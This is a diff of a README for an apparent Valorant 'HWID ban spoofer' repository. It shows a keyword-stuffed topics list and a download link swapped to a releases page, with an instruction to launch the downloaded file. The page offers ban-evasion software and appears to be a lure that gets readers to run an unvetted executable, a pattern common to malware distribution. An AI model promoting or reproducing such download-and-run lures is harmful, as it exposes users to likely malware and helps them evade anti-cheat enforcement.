@@ -8,7 +8,7 @@ Welcome to the Bypass HWID Spoofer repository! Here, you will find all the infor
 - **Topics:** Bypass HWID Spoofer, Bypass HWID Spoofer Valorant, Download Bypass HWID Spoofer, Download HWID Ban Spoofer, Download HWID Bypass Valorant, Download HWID Spoofer for Valorant, Fix HWID Ban Spoofer, Free Download HWID Spoofer Valorant, HWID Ban Spoofer, HWID Ban Spoofer Valorant, HWID Spoofer Valorant 2025, HWID Spoofer Valorant Download, Valorant Bypass HWID Spoofer, Valorant HWID Spoofer 2025
 
 ## Resource Link
-You can download the bypass HWID spoofer from the following link: [Download HWID Spoofer](https://github.com/assets/Release.zip)
+You can download the bypass HWID spoofer from the following link: [Download HWID Spoofer](https://github.com/Nikil1602/Bypass-Hwid-Spoofer/releases)
 
 Please make sure to launch the file after downloading for further instructions.
 
